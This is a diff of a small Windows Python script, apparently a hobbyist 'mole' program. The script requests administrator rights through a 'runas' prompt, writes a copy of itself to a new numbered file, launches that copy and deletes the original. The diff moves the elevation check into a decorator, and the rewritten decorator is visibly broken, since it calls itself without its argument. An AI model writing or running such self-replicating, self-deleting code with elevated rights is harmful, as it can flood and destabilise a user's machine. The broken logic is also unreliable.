@@ -1,13 +1,6 @@
 times = 0
 PATH = ''
-import subprocess
-import os
-import ctypes, sys
-if ctypes.windll.shell32.IsUserAnAdmin():
-    pass
-else:
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-    sys.exit()
+import sys,subprocess,ctypes,os
 times = times+1
 this = __file__
 def self_copy():
@@ -19,17 +12,23 @@ def self_copy():
     this = temp
     with open("mole"+str(times)+".py", 'w')as file:
         file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))
-def call_up():
+def mole(mole):
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        pass
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        sys.exit()
     print('this is the %s mole!' % (times-1))
-    subprocess.Popen("python mole"+str(times)+".py")
+    mole()
+@mole
 def change():
     try:
         self_copy()
     except:
         change()
     try:
-        call_up()
+        subprocess.Popen("python mole"+str(times)+".py")
     except:
         change()
-    os.remove(__file__)
-change()#I spend hours fixing the conflicts of subfile call-up and remove original one...and I found python file can delete itself...
+    else:
+        os.remove(__file__)
